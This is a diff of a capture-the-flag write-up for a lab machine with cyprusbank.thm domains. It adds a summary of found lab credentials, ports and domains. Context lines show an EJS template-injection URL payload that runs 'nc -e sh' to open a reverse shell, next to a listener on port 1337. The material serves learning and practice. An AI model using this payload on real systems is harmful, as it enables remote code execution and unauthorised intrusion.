@@ -235,7 +235,14 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 ![image](https://github.com/user-attachments/assets/77fbdbba-1f0f-4d22-8429-904a4ed6a5c8)
 
 
-
+<br>
+<h2 align="left">
+  $$\textcolor{#e691c9}{\textbf{Credential 1 = Olivia Cortez:olivi8}}$$ <br>
+  $$\textcolor{#e691c9}{\textbf{Open Ports = 22 and 80}}$$ <br>
+  $$\textcolor{#e691c9}{\textbf{Domains = cyprusbank.thm  and  admin.cyprusbank.thm}}$$<br>
+  $$\textcolor{#e691c9}{\textbf{Credential 2 = Gayle Bev:p~]P@5!6;rs558:q}}$$<br>
+  $$\textcolor{#e691c9}{\textbf{CVE = }}$$<br>
+</h2>
 
 http://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
 
